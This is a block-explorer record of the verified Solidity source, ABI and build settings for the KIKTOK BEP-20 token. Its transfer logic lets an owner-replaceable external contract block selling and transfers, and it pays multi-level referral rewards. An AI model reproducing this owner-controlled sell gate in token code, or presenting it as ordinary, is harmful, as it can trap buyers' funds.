{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b);\r\n        // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ninterface IPancakeFactory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IPancakeRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint256 liquidity,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256 amountETH);\r\n\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint256 liquidity,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline,\r\n        bool approveMax,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external returns (uint256 amountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ninterface IPancakePair {\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function sync() external;\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n}\r\n\r\ninterface KIKDAO{\r\n    function swapWhiteList(address user) external view returns (bool);\r\n    function relationship(address child) external view returns (address);\r\n    function addRetation(address sender, address recipient) external returns (bool);\r\n    function _limitSwap() external returns (bool);\r\n}\r\n\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function waiveOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract KIKTOK is Context, IERC20, IERC20Metadata, Ownable {\r\n    using SafeMath for uint256;\r\n    string private _name;\r\n\r\n    string private _symbol;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    address private created;\r\n\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n    address public marketAddress = 0x93df8F348C44BdEEE9110c8a86FD1d5C3029Dbf2;\r\n\r\n    address public _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    mapping(address => bool) public isExcludedFromFee;\r\n\r\n    address public _pair;\r\n\r\n    uint256 public _maxTxAmount = 10;\r\n\r\n    uint256 public txlimitByBnb = 2 * 10**18;\r\n\r\n    uint256 public finalSupply = 91 * 10**4 * 10**18;\r\n\r\n    uint256 public openBlock = 19028187;\r\n\r\n    uint256 public limitBlock = 19028187;\r\n\r\n    KIKDAO public relateContract = KIKDAO(0x3475c6E34c117e14627c74F242d92ECDD39AE62F);\r\n\r\n    constructor() {\r\n        _name = \"KIKTOK\";\r\n        _symbol = \"KIKTOK\";\r\n        _mint(owner(), 91 * 10**6 * 10**18);\r\n        IPancakeRouter router = IPancakeRouter(_router);\r\n        _pair = IPancakeFactory(router.factory()).createPair(\r\n            address(this),\r\n            router.WETH()\r\n        );\r\n        isExcludedFromFee[owner()] = true;\r\n        isExcludedFromFee[_router] = true;\r\n        isExcludedFromFee[marketAddress] = true;\r\n        isExcludedFromFee[address(this)] = true;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(\r\n            currentAllowance >= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(uint256 amount) internal virtual returns (uint256) {\r\n        if (_totalSupply < finalSupply) {\r\n            return amount;\r\n        }\r\n        if (_totalSupply.sub(amount) <= finalSupply) {\r\n            uint256 burnAmount = _totalSupply.sub(finalSupply);\r\n            _totalSupply = _totalSupply.sub(burnAmount);\r\n            _balances[deadAddress] = _balances[deadAddress].add(burnAmount);\r\n            emit Transfer(address(0), deadAddress, burnAmount);\r\n            return amount.sub(burnAmount);\r\n        } else {\r\n            _totalSupply = _totalSupply.sub(amount);\r\n            _balances[deadAddress] = _balances[deadAddress].add(amount);\r\n            emit Transfer(address(0), deadAddress, amount);\r\n            return 0;\r\n        }\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        addNextAdd(sender, recipient);   \r\n        if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {\r\n            _basicTransfer(sender, recipient, amount);\r\n        } else {\r\n            limitTx(amount);\r\n            if (sender == _pair) {\r\n                if(block.number < openBlock){\r\n                    require(relateContract.relationship(recipient) != address(0) || amount < _maxTxAmount / 4, \"Not yet open\");\r\n                }\r\n                if(block.number < limitBlock){\r\n                    require(relateContract.swapWhiteList(recipient),\"Not yet open\");\r\n                }\r\n                uint256 senderBalance = _balances[sender];\r\n                require(\r\n                    senderBalance >= amount,\r\n                    \"ERC20: transfer amount exceeds balance\"\r\n                );\r\n                unchecked {\r\n                    _balances[sender] = senderBalance.sub(amount);\r\n                }\r\n                uint256 share = amount.div(100);\r\n                uint256 surplus = promotionRewards(tx.origin, share);\r\n                _balances[recipient] = _balances[recipient].add(\r\n                    share.mul(88).add(surplus)\r\n                );\r\n                emit Transfer(sender, recipient, share.mul(88).add(surplus));\r\n            }\r\n            else if(recipient == _pair){\r\n                if(relateContract._limitSwap()){\r\n                    require(relateContract.swapWhiteList(sender),\"You cannot sell\");\r\n                }else{\r\n                    require(!relateContract.swapWhiteList(sender),\"You cannot sell\");\r\n                }\r\n                if(block.number < openBlock){\r\n                    require(relateContract.relationship(sender) != address(0) || amount < _maxTxAmount / 4, \"Not yet open\");\r\n                }\r\n                _basicTransfer(sender, recipient, amount);\r\n            } \r\n            else {\r\n                if(relateContract._limitSwap()){\r\n                    require(relateContract.swapWhiteList(sender),\"You cannot transfer out\");\r\n                }else{\r\n                    require(!relateContract.swapWhiteList(sender),\"You cannot transfer out\");\r\n                }\r\n                uint256 senderBalance = _balances[sender];\r\n                require(\r\n                    senderBalance >= amount,\r\n                    \"ERC20: transfer amount exceeds balance\"\r\n                );\r\n                unchecked {\r\n                    _balances[sender] = senderBalance.sub(amount);\r\n                }\r\n                uint256 share = amount.div(100);\r\n                uint256 noBurn = _burn(share.mul(5));\r\n                _balances[recipient] = _balances[recipient].add(\r\n                    share.mul(95).add(noBurn)\r\n                );\r\n                emit Transfer(sender, recipient, share.mul(95).add(noBurn));\r\n            }\r\n        }\r\n    }\r\n\r\n    function _basicTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount,\"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function setIsExcludedFromFee(address account, bool newValue)\r\n        public\r\n        onlyOwner\r\n    {\r\n        isExcludedFromFee[account] = newValue;\r\n    }\r\n\r\n    function setMarketAddress(address _marketAddress) public onlyOwner{\r\n        marketAddress = _marketAddress;\r\n    }\r\n\r\n    function setTxlimitByBnb(uint256 _txLimitByBnb) public onlyOwner{\r\n        txlimitByBnb = _txLimitByBnb;\r\n    }\r\n\r\n    function setRelateContract(KIKDAO _relateContract) public onlyOwner{\r\n        relateContract = _relateContract;\r\n    }\r\n\r\n    function setOpenBlock(uint256 _openBlock) public  onlyOwner{\r\n        openBlock = _openBlock;\r\n    }\r\n\r\n    function setLimitBlock(uint256 _limitBlock) public  onlyOwner{\r\n        limitBlock = _limitBlock;\r\n    }\r\n\r\n    function setPair(address pair) public onlyOwner{\r\n        _pair = pair;\r\n    }\r\n\r\n    function addNextAdd(address sender, address recipient) private {\r\n        relateContract.addRetation(sender, recipient);\r\n    }\r\n\r\n    function isContract(address account) public view returns (bool) {\r\n        // This method relies on extcodesize, which returns 0 for contracts in\r\n        // construction, since the code is only stored at the end of the\r\n        // constructor execution.\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n\r\n    function promotionRewards(address sender, uint256 share)\r\n        private\r\n        returns (uint256)\r\n    {\r\n        address pre = relateContract.relationship(sender);\r\n        uint256 total = share.mul(12);\r\n        uint256 a;\r\n        if (pre != address(0)) {\r\n            if(_balances[pre] > 0){\r\n                a = share.mul(3);\r\n                _balances[pre] = _balances[pre].add(a);\r\n                total = total.sub(a);\r\n                emit Transfer(sender, pre, a);\r\n            }\r\n            pre = relateContract.relationship(pre);\r\n        }\r\n        if (pre != address(0)) {\r\n            if (holdCoinlimit(pre, _maxTxAmount)) {\r\n                a = share.mul(2);\r\n                _balances[pre] = _balances[pre].add(a);\r\n                total = total.sub(a);\r\n                emit Transfer(sender, pre, a);\r\n            }\r\n            pre = relateContract.relationship(pre);\r\n        }\r\n        if (pre != address(0)) {\r\n            if (holdCoinlimit(pre, _maxTxAmount)) {\r\n                a = share;\r\n                _balances[pre] = _balances[pre].add(a);\r\n                total = total.sub(a);\r\n                emit Transfer(sender, pre, a);\r\n            }\r\n            pre = relateContract.relationship(pre);\r\n        }\r\n        uint256 marketBonusAmount = share.mul(3);\r\n        _balances[marketAddress] = _balances[marketAddress].add(marketBonusAmount);\r\n        total = total.sub(marketBonusAmount);\r\n        emit Transfer(sender, marketAddress, marketBonusAmount);\r\n        return _burn(total);\r\n    }\r\n\r\n    function holdCoinlimit(address holder, uint256 limitNumer)\r\n        internal\r\n        view\r\n        returns (bool)\r\n    {\r\n        return _balances[holder] >= limitNumer;\r\n    }\r\n\r\n    function limitTx(uint256 amount) internal {\r\n        (uint256 reserve0, uint256 reserve1, ) = IPancakePair(_pair)\r\n            .getReserves();\r\n\r\n        if (reserve1 > 0 && address(this) == IPancakePair(_pair).token0()) {\r\n            _maxTxAmount = reserve0.mul(txlimitByBnb).div(reserve1);\r\n        }\r\n        if (reserve0 > 0 &&  address(this) == IPancakePair(_pair).token1()) {\r\n            _maxTxAmount = reserve1.mul(txlimitByBnb).div(reserve0);\r\n        }\r\n        require(\r\n            amount <= _maxTxAmount,\r\n            \"Transfer amount exceeds the maxTxAmount.\"\r\n        );\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_router\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"finalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isContract\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"relateContract\",\"outputs\":[{\"internalType\":\"contract KIKDAO\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setIsExcludedFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_limitBlock\",\"type\":\"uint256\"}],\"name\":\"setLimitBlock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_marketAddress\",\"type\":\"address\"}],\"name\":\"setMarketAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_openBlock\",\"type\":\"uint256\"}],\"name\":\"setOpenBlock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract KIKDAO\",\"name\":\"_relateContract\",\"type\":\"address\"}],\"name\":\"setRelateContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_txLimitByBnb\",\"type\":\"uint256\"}],\"name\":\"setTxlimitByBnb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txlimitByBnb\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"waiveOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KIKTOK", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://13b76a47480410d97b3a7cd7f503b6e8c9613f76b6ecc5bbc323bc3584278e0f"}